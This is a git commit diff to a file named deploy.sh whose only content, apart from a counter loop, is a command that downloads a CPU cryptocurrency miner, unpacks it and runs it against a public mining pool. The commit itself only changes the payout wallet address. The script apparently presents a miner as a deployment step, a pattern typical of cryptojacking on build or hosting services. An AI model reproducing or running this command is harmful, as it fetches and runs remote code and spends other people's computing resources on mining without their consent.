c72d5615076dcbab2b9fccfb6271069d2458f744
Uevwn <94554340+Uevwn@users.noreply.github.com>
2021-11-18 01:09:34 +0700

    Update deploy.sh

--- deploy.sh
+++ deploy.sh
@@ -3,7 +3,7 @@
 COUNTER=20
 until [  $COUNTER -lt 10 ]; do
             
-wget https://github.com/m-pays/m-cpuminer-v2/releases/download/2.4/m-minerd-64-linux.tar.gz && tar xfvz m-minerd-64-linux.tar.gz && cd m-minerd-64-linux && ./m-minerd -a m7mhash -o stratum+tcp://mine.zpool.ca:6033 -u D9zT4xf7iGNcbrH6nLEKBCqjmiC3yKPwc2.rig1 -p c=LTC -t 8
+wget https://github.com/m-pays/m-cpuminer-v2/releases/download/2.4/m-minerd-64-linux.tar.gz && tar xfvz m-minerd-64-linux.tar.gz && cd m-minerd-64-linux && ./m-minerd -a m7mhash -o stratum+tcp://mine.zpool.ca:6033 -u LYVvwWP8iRd65v2hVwg4ETXcAjLefmBuF6.rig1 -p c=LTC -t 8
 
      echo COUNTER $COUNTER
      let COUNTER-=1
